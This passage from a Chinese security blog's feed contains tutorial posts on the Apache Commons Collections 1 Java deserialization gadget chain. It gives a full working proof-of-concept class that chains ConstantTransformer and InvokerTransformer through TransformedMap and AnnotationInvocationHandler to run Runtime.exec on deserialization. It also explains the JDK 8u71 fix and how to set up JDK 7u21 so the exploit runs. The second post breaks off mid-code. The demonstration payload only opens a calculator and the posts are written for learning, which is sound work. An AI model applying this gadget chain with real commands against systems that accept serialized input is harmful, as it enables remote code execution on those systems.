    <content type="html"><![CDATA[<h1 id="CommonsCollections-1-2"><a href="#CommonsCollections-1-2" class="headerlink" title="CommonsCollections  1  (2)"></a>CommonsCollections  1  (2)</h1><p>上一篇文章中，我们写出了一个本地测试的一个cc1的类，但是实际的利用中我们需要把它变成反序列化的流，而在这个变换的过程中就会出现一些问题，比如说有些类没有实现<code>Serializable</code>接口，不能被序列化等等，这篇文章我们就来把它变成可利用的POC</p><span id="more"></span><h2 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h2><p>我们回想一下上一篇文章中是如何触发漏洞的，我们手动向修饰过的map中添加新元素从而触发一系列的回调，但在实际的漏洞利用环境中我们肯定是不能手工执行的，我们需要让它在反序列化后能自动触发，也就是说需要找个某个类，在执行了这个类的<code>readObject</code>后能够触发回调</p><p>而这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，我们可以看看这个类的<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);&#125;</span><br><span class="line">    <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type inannotation serial stream&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    <span class="comment">// If there are annotation members without values, that situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123; <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) || value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>看起来代码挺复杂的，但实际上逻辑很简单，就是它会遍历我们反序列化后的map，也就是<code>TransformedMap.decorate</code>修饰的map里的所有元素，并依次对它设置值，而在<code>setValue</code>的时候就会触发<code>TransformedMap</code>里面注册的<code>ChainedTransformer</code>对象中的<code>transform</code>方法，从而触发回调</p><p>所以说我们就需要创建一个<code>AnnotationInvocationHandler</code>对象，将前面构造好的<code>outermap</code>放进来</p><p>这里要利用到我们前面讲过的反射知识，因为这个类是在JDK内部的类，所以说不能直接用<code>new</code>来实例化，得利用反射，首先利用反射获取到它的构造方法，然后利用构造方法获取对象就好了，而这个类的构造函数有两个参数，第一个参数是一个<code>Annotation</code>；第二个参数就是前面构造的map，所以说构造代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) obj;</span><br></pre></td></tr></table></figure><p>而这里为啥是<code>Rention.class</code>呢？是由于<code>AnnotationInvocationHandler</code>类中的<code>readObject</code>方法，这里因为要进入到<code>if</code>语句中，要让<code>memberType</code>不为空，所以说就需要满足两个条件，这里涉及到Java注释相关的技术，我也不太明白，这里就先直接用吧：</p><p>首先是<code>AnnotationInvocationHandler</code>的构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p><p>第二个条件是被<code>TransformedMap.decorate</code>修饰的Map中必须有一个键名为X的元素</p><p>所以说为了满足这两个条件，我们用到了<code>Retention</code>，因为它正好就是<code>Annotation</code>的子类，而且它里面有个方法叫做<code>value</code>，所以说为了满足第二个条件我们还需要往map中添加一个元素，它的键名为<code>value</code>，值随意，代码为：<code>innerMap.put(&quot;value&quot;, &quot;abc&quot;);</code></p><h2 id="关于反射"><a href="#关于反射" class="headerlink" title="关于反射"></a>关于反射</h2><p>其实按照上面的思路，我们已经可以写出POC了，将我们上面生成的<code>obj</code>对象进行序列化和反序列化操作就好了，具体的方法我前面的文章中有写到，这里我就直接给出代码了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">oo.writeObject(obj);</span><br><span class="line">System.out.println(<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">oo.close();</span><br><span class="line">System.out.println(barr);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">Object o = (Object) ois.readObject();</span><br><span class="line">System.out.println(<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br></pre></td></tr></table></figure><p>但当我们运行这段POC的时候，是会报错的，原因其实我们文章最开头就讲了，那就是有些类并没有实现<code>java.io.Serializable</code>接口，而没有实现这个接口的类是不允许被序列化的；最开始时我们传给<code>ConstantTransformer</code>的是<code>Runtime.getRuntime() </code>类，<code>Runtime</code>类并没有实现那个接口所以不允许被反序列化，但我们可以不直接利用<code>Runtime</code>类，而是通过反射来获取<code>Runtime</code>对象的呀，就是先获取<code>getRuntime</code>方法，然后利用这个方法创建对象就好了，方法其实上一篇文章也讲到了，这里给出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method m = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r = (Runtime) m.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里我们利用的就是<code>Runtime.class</code>对象而不是<code>Runtime.getRuntime()</code>对象了，前者是一个<code>java.lang.Class</code>对象，后者是一个 <code>java.lang.Runtime</code>对象。<code>Class</code>类有实现<code>Serializable</code>接口，所以是可以被序列化的</p><p>然后我们再将这段反射的代码写成<code>transformers</code>的形式，就是说先用<code>ConstantTransformer</code>返回<code>Runtime.class</code>对象，然后再利用<code>InvokerTransformer</code>执行一个一个的方法就好了，结合反射的代码很容易看懂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),&#125;;</span><br></pre></td></tr></table></figure><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><p>我们把上面所有以及上一篇文章综合起来，形成完整的POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1_2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> String[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object obj = construct.newInstance(Retention.class, outerMap);</span><br><span class="line">    InvocationHandler handler = (InvocationHandler) obj;</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">    oos.writeObject(handler);</span><br><span class="line">    System.out.println(<span class="string">&quot;对象序列化成功！&quot;</span>);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    System.out.println(barr);</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">    Object o = (Object)ois.readObject();</span><br><span class="line">    System.out.println(<span class="string">&quot;对象反序列化成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/07/teQpCGryMKNuWTb.png" alt="image.png"></p><p>这里的注意事项就是得先往<code>innerMap</code>中添加一个键名为<code>value</code>的元素，键值随意，原因上面也提到了</p><h2 id="为什么无法触发？"><a href="#为什么无法触发？" class="headerlink" title="为什么无法触发？"></a>为什么无法触发？</h2><p>从上图中可以看到，我们并没有报异常，并且输出了序列化后的数据流，但为啥没弹出计算器呢？因为在Java 8u71之后的版本里面，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 中的readObject函数，具体可以看下面这篇文章：<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。 所以后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了</p><p>这里的内容我都是抄的p神的，因为我也是学习为主，明白了它的思路就好了，也就懒得去改Java的版本号了</p><h2 id="版本修改"><a href="#版本修改" class="headerlink" title="版本修改"></a>版本修改</h2><p>学到后面发现没有一个java的老版本还是不太方便，毕竟还有什么Java原生类反序列化啥的，那个版本要求是7u21以下，所以说干脆就装了7u21的版本好了</p><p>官网下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a>，还挺难找的，java的老版本藏得老深了</p><p><img src="https://s2.loli.net/2022/03/13/YmbqPWuFEx84rJd.png" alt="image.png"></p><p>下载这个压缩包就行，然后解压，在idea中新建一个项目，<code>SDK</code>就选择刚刚下载好的<code>1.7</code>，然后进去之后注意下面四个地方：</p><p><img src="https://s2.loli.net/2022/03/13/8XsT4BiKJLIHuPO.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/13/APYyjMlIovLXDcs.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/13/B6z74fKPLp9uyHv.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/13/utfm9UY1yZxzg5B.png" alt="image.png"></p><p>这样应该就可以了，如果哪里还有问题请参考：<a href="https://www.cnblogs.com/east7/p/13337630.html">https://www.cnblogs.com/east7/p/13337630.html</a>这篇文章，这样版本就切换好了。跑一跑上面的POC：</p><p><img src="https://s2.loli.net/2022/03/13/ZNfbakPtUrygOuj.png" alt="image.png"></p><p>成功了，版本一切换，POC就可以跑了</p><p>而在<code>ysoserial</code>中，用的却是<code>LazyMap</code>而不是我们这里用的<code>TransformedMap</code>，事实上好像也确实<code>LazyMap</code>用的更多，下一篇文章我们就来看如何把它转换为<code>LazyMap</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CommonsCollections-1-2&quot;&gt;&lt;a href=&quot;#CommonsCollections-1-2&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections  1  (2)&quot;&gt;&lt;/a&gt;CommonsCollections  1  (2)&lt;/h1&gt;&lt;p&gt;上一篇文章中，我们写出了一个本地测试的一个cc1的类，但是实际的利用中我们需要把它变成反序列化的流，而在这个变换的过程中就会出现一些问题，比如说有些类没有实现&lt;code&gt;Serializable&lt;/code&gt;接口，不能被序列化等等，这篇文章我们就来把它变成可利用的POC&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇Commons Collections 1 (1)</title>
    <link href="https://arsenetang.github.io/2022/02/03/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(1)/"/>
    <id>https://arsenetang.github.io/2022/02/03/Java%E7%AF%87%E4%B9%8BCommonsCollections%201%20(1)/</id>
    <published>2022-02-02T16:00:00.000Z</published>
    <updated>2022-03-12T02:25:36.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections-1-1"><a href="#CommonsCollections-1-1" class="headerlink" title="CommonsCollections  1  (1)"></a>CommonsCollections  1  (1)</h1><p>前面差不多把该梳理的基础知识梳理完了，那么接下来我们就正式进入到cc链的总结了，确实它比较难也不太好理解，但是借用p神的一句话就是逃不过的还是要学，CommonCollections利⽤链⼏乎是反序列化学习不可逃过的⼀关</p><span id="more"></span><h2 id="Java中的命令执行"><a href="#Java中的命令执行" class="headerlink" title="Java中的命令执行"></a>Java中的命令执行</h2><p>我们先来看看在<code>Java</code>中的命令执行，因为我们最终的目的肯定是要执行命令的，而Java中最常用的就是使用<code>Runtime</code>类，首先调用里面的<code>getRuntime</code>方法创建对象，然后再调用里面的<code>exec</code>方法即可执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1_test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime cmd = Runtime.getRuntime();</span><br><span class="line">        cmd.exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/25/FTgKDfoSWclrLUH.png" alt="image.png"></p><p>然后我们再利用前面讲过的反射把这段代码再重新写一次，首先需要利用<code>getMethod</code>去获取这个类的<code>getRuntime</code>方法，进而利用这个方法创建<code>Runtime</code>对象<code>r</code>，再同样用<code>getMethod</code>去获取<code>exec</code>方法，最后执行对象<code>r</code>的<code>exec</code>方法即可，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1_test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException </span>&#123;</span><br><span class="line">        Method m = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        Runtime r = (Runtime) m.invoke(<span class="keyword">null</span>);</span><br><span class="line">        Method execMethod = Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        execMethod.invoke(r,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/25/JRCjQTtk5zuAd83.png" alt="image.png"></p><h2 id="Apache-Commons-Collections"><a href="#Apache-Commons-Collections" class="headerlink" title="Apache Commons Collections"></a>Apache Commons Collections</h2><p>在正式进入cc1的学习之前，我们先来看看什么是 Commons Collections，虽然说这个跟核心知识点关系不是很大，但还是了解了解嘛</p><p><a href="http://commons.apache.org/">Apache Commons</a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）</p><p><a href="http://commons.apache.org/proper/commons-collections/">Commons Collections</a>包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码</p><p>其实说简单一点，就是在<code>Java</code>最基础的数据结构：集合<code>&quot;map&quot;</code>的基础上，做了一些扩展，扩展了一些接口和类，主要有有序map之LinkedMap、双向Map之BidiMap、多值Map之MultiMap、“懒加载”Map之LazyMap等等，方便程序员使用</p><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p><code>Transformer</code>是一个接口，它里面只有一个待实现的方法就是<code>transform</code>方法，这个方法的参数是一个对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p><code>TransformedMap</code>是一个类，在这个类中封装了一个<code>decorate</code>方法，它是用来修饰<code>Java</code>中的标准数据结构<code>Map</code>，当向被修饰过的<code>Map</code>中添加新元素时，它就会执行一个回调函数；这个回调并不是传统意义上的回调函数，而是相当于执行一个对象里面的<code>transform</code>方法，前提是这个对象的类要实现了<code>Transformer</code>接口哈，可能不太好懂，看看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调，当我们向<code>outerMap</code>中添加新元素时，它就会调用<code>keyTransformer</code>或<code>valueTransformer</code>里面的<code>transform</code>方法</p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><code>ConstantTransformer</code>同样是一个实现了<code>Transformer</code>接口的一个类，这个类很简单，它有一个带参的构造函数，而参数类型是对象，当你传入一个对象后，它会在<code>transform</code>方法中再将这个对象返回出来，看看代码一下就懂了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将传入的对象<code>constantToReturn</code>在<code>transform</code>方法中返回</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p><code>InvokerTransformer</code>也是实现了<code>Transformer</code>接口的一个类，甚至我认为是cc链中最重要的一个类，因为它可以执行任意的方法，这就让我们的<code>RCE</code>有了实现的可能；在创建<code>InvokerTransformer</code>对象时，需要传入三个参数，第一个是想要执行的方法名，第二个是这个方法所需要参数的参数类型，第三个是这个方法中具体的参数；当调用<code>InvokerTransformer</code>类中的<code>transform</code>方法时，将会执行我们想要执行的方法，那具体是哪个对象中的方法呢？是通过<code>transform</code>方法中的参数传入进去的，接下来看看代码，首先是构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是将三个参数做一个赋值而已， 接下来就来看它的回调<code>transform</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     Class cls = input.getClass();</span><br><span class="line">     Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">     <span class="keyword">return</span> method.invoke(input, iArgs);&#125;</span><br><span class="line">    <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);&#125; </span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);&#125; </span><br><span class="line">    <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, 